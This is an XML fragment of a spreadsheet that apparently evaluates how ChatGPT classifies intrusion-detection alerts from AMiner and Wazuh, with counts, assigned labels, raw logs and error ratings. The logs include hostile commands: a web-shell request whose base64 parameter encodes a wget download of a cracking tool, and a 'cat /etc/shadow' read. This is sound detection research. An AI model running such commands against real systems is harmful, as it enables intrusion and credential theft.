          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and tool name WPSca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WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”,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WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Legitimate Credentials Abuse, </text:p>
            <text:p>Ini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christopher.friedman&gt;, method=PLAIN, rip=192.168.128.195, lip=192.168.128.195, mpid=4382, TLS, session=&lt;8yfdQ9rVLL7AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name imap and IDS mitre classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p><text:span text:style-name="T4">Web Attack</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</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Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,  </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to WordPress folder</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Attempted Access</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attempted access to password file</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Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA HTTP unable to match response to request”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name http and tool name suricata</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”,</text:p>
            <text:p>Raw Data: “SURICATA HTTP unable to match response to request [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name http and tool name suricata</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Credential Access, </text:p>
            <text:p>Brute Force</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assword Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid handshake message [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly,</text:p>
            <text:p>Potential Evasion Technique</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”,  “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw data: “intranet-server systemd: pam_unix(systemd-user:session): session opened for user phopkins by (uid=0)”</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 </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”, “PAM: Login session opened.”, mitre – techniq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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)”</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2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">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Credential Access</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cat /etc/shadow”</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2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B34])" office:value-type="float" office:value="89" calcext:value-type="float">
            <text:p>89</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_chatgpt_run2" table:style-name="ta1">
        <table:table-column table:style-name="co1"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Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on low frequency of DNS A record queries which might indicate probing </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Brute Force, </text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IMAP login disconnects without authentication attempt</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Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “Newpath(es) detected”</text:p>
            <text:p>Raw Data: “no host name found for IP address [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on log message indicating hostname resolving failed repeatedl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Access Attempt,</text:p>
            <text:p>Reconnaissance</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probably based on attempted access to web server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Misuse, </text:p>
            <text:p>SSL/TLS Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name TLS and log message indicating unexpected TLS</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Service Enumeration,</text:p>
            <text:p>Web Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nsml" xlink:type="simple">https://nmap.org/book/nsml</text:a>)”</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Application Scanning,</text:p>
            <text:p>Service Discovery</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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on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Network Scanning</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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Discovery</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Classification probably based on attempted access to web server bas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Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”,  “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (<text:a xlink:href="https://wpscan.com/wordpress-security-scanner" xlink:type="simple">https://wpscan.com/wordpress-security-scanner</text:a>)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan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eb Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wntent/plu/analytics-for-wp/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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Scanning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/animated-typing-effect/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Exploit Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/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eb Application Scanning </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/eCobiz/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attempted access to sensitive password file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Fuzzing</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itial Access, </text:p>
            <text:p>Exploit Public-Facing Application</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php file in WordPres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scovery, </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php file in WordPres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
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters, http status code 404 and attempted access to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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected” </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WordPress directory without proper DirectoryIndex</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ttempted Privilege Escalation,</text:p>
            <text:p>Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type”, “New path(es) detected” </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to hidden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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 301 (moved permanently) and attempted access to WordPress plugin path</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Scanning, </text:p>
            <text:p>Information Discovery</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Classification probably based on attempted access to php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Shell Upload Attempt,</text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress themes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Web Application Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/includes/classes/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters, http status code 404, attempted access to WordPress theme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Web Application Reconnaissance</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ttempted access to php file in WordPres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Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected” </text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress plugin folder and http status code 403</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rectory Traversal / Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”, </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress theme folder and special characters in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 Path Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php config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Unauthorized Access Attempt</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attempted access to WordPress themes directory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Unauthorized Access Attempt / Web Shell Detection</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attempted access to WordPress themes directory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Unauthorized Access Attempt / Credential Access</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attempted access to sensitive password file in WordPress admin folder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Reconnaissance / Directory Enumeration </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/@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Denied / Security Controls</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ttempted access to hidden file in WordPres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Unauthorized Access Attempt, </text:p>
            <text:p>Directory Traversal / Information Gathering</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ttempted access to hidden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Unauthorized Access Attempt,</text:p>
            <text:p>Information Disclosure Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to hidden sensitive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File Enumeration, </text:p>
            <text:p>Reconnaissance</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ttempted access to php file in WordPress admin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Web Shell Execution, </text:p>
            <text:p>Remote Code Execution</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because of base64 encoded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Web Shell Execution, </text:p>
            <text:p>Command and Control</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload and decoded payload containing github repository referenc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Shell Execution, </text:p>
            <text:p>Lateral Movement</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because of base64 encoded payload</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Incorrec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Unusual HTTP Method Usage,</text:p>
            <text:p>Potential Application Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high frequency of apache access request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DNS Tunneling, </text:p>
            <text:p>Data Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Fequency anomaly detected”</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name DN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 </text:p>
            <text:p>HTTP Request Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high frequency of apache access reques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Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell Execution,  </text:p>
            <text:p>Remote Code Execution</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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded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Lateral Movement</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Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkin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Lateral Movement</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Credential Access, </text:p>
            <text:p>Credential Dumping</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 and PAM authent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Credential Access, </text:p>
            <text:p>Credential Dumping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_acct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 and PAM authent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Credential Access, </text:p>
            <text:p>Credential Dumping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq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 and PAM authent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ersistence, </text:p>
            <text:p>Session Hijacking</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probably based on tool name and opened session</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B53])" office:value-type="float" office:value="93" calcext:value-type="float">
            <text:p>93</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_chatgpt_run2" table:style-name="ta1">
        <table:table-column table:style-name="co25" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1"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Valid Credential Use, </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “dovecot: imap-login: Login: user=&lt;damian.jordan&gt;, method=PLAI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TLS Protocol Anomaly,</text:p>
            <text:p>Potential Protocol Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and malformed TLS packet</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TLS Protocol Anomaly,</text:p>
            <text:p>Potential Protocol Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">IDS: “Suricata: Alert – </text:span>SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and invalid handshake message</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TLS Protocol Anomaly,</text:p>
            <text:p>Potential Protocol Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and malformed TLS packet</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>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TLS Protocol Anomaly,</text:p>
            <text:p>Potential Protocol Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid handshake message [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and invalid handshake message</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SSH Reconnaissance,</text:p>
            <text:p>Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre: technique – “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and raw data inform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text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
